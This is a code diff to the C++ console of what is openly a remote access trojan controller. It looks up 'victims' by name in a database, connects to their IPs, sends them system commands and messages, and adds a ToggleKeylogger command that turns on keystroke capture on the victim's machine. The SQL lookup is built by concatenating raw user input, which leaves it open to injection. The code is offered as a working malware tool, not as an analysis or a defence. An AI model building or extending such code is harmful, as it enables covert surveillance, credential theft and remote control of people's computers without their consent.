@@ -79,9 +79,12 @@ int main(int argc, char** argv)
 		else if (input == "connect" || input == "Connect") {
 			UFuncts::printfC("Enter name: ", 5, 0, 0, 0);
 			getline(cin, input);
-			vicName = input;
 			RatDB.Query("SELECT IP FROM victims where Name='" + input + "'");
-			RatDB.GetRow();
+			if (!RatDB.GetRow()) {
+				vicName = "Invalid Name";
+				continue;
+			}
+			vicName = input;
 			cout << RatDB.row[0] << endl;
 
 			PCSTR ip = RatDB.row[0];
@@ -97,6 +100,7 @@ int main(int argc, char** argv)
 			recvThread = thread(recvLoop, &Victim, vicName);
 		}
 		else if (input == "disconnect" || input == "Disconnect") {
+			Victim.SendDataT<Packets>(Packets::P_Disconnect);
 			Victim.DisConnect();
 			recvThread.join();
 		}
@@ -109,14 +113,16 @@ int main(int argc, char** argv)
 					loop = false;
 					continue;
 				}
+				Victim.SendDataT<Packets>(Packets::P_MSG);
 				Victim.SendDataT<string>(input);
 				Sleep(2000);
 			};
 		}
 		else if (input == "help" || input == "Help") {
-			UFuncts::printfC("SendSysCmd, MessageVictim, Disconnect, Connect, ListVic, Exit, Help", 6, 0, 0, 0);
+			UFuncts::printfC("ToggleKeylogger, SendSysCmd, MessageVictim, Disconnect, Connect, ListVic, Exit, Help", 6, 0, 0, 0);
 			printf("\n");
-		}else if (input == "sendsyscmd" || input == "SendSysCmd") {
+		}
+		else if (input == "sendsyscmd" || input == "SendSysCmd") {
 			UFuncts::printfC("Enter Command: ", 5, 0, 0, 0);
 			getline(cin, input);
 			Victim.SendDataT<Packets>(P_CMD);
@@ -124,6 +130,9 @@ int main(int argc, char** argv)
 			UFuncts::printfC("Returned:", 6, 0, 0, 0);
 			printf("\n");
 			Sleep(1000);
+		}
+		else if (input == "togglekeylogger" || input == "ToggleKeylogger") {
+			Victim.SendDataT<Packets>(Packets::P_KEYLOG);
 		}
 	} while (run);
 
